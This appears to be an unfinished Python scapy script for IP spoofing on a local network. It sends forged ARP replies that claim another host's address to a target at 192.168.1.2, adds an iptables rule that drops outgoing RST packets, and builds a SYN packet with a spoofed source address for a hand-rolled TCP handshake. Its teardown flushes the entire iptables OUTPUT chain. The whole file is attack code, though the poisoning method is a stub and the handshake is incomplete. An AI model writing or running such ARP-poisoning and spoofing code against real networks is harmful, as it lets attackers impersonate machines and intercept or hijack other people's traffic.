from scapy.all import *


class SpoofedTCPIPConnection(object):
    def __init__(self, src_ip, src_port, dst_ip, dst_port):
        self.dst_port = dst_port
        self.dst_ip = dst_ip
        self.src_port = src_port
        self.src_ip = src_ip
        self._seq_num = random.randint(1, 65535)

    def connect(self):
        self._configure_OS()
        self._poison_arp()
        self._handshake()

    def _handshake(self):
        syn_pckt = IP(src=self.src_ip, dst=self.dst_ip) / TCP(sport=self.src_port, dport=self.dst_port, flags='S',
                                                              seq=self._seq_num)
        synack = sr(syn_pckt, timeout=1)

    def close(self):
        self._clear_OS_config()

    def _configure_OS(self):
        """
        add a rule to drop outgoing RST tcp packets
        """
        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')

    def _clear_OS_config(self):
        os.system('iptables --flush OUTPUT')

    def _poison_arp(self):
        pass

    def _send_arp_response(self):
        arp_pckt = ARP(hwdst='ff:ff:ff:ff:ff:ff', op=ARP.is_at, psrc=self.src_ip, pdst='192.168.1.2')
        send(arp_pckt)


if __name__ == '__main__':
    src_ip = '192.168.1.17'
    src_port = random.randint(1024, 65535)
    dst_ip = '192.168.1.2'
    dst_port = 8080

    c = SpoofedTCPIPConnection(src_ip, src_port, dst_ip, dst_port)
    try:
        c._send_arp_response()
        # c.connect()
    except:
        pass

    c.close()
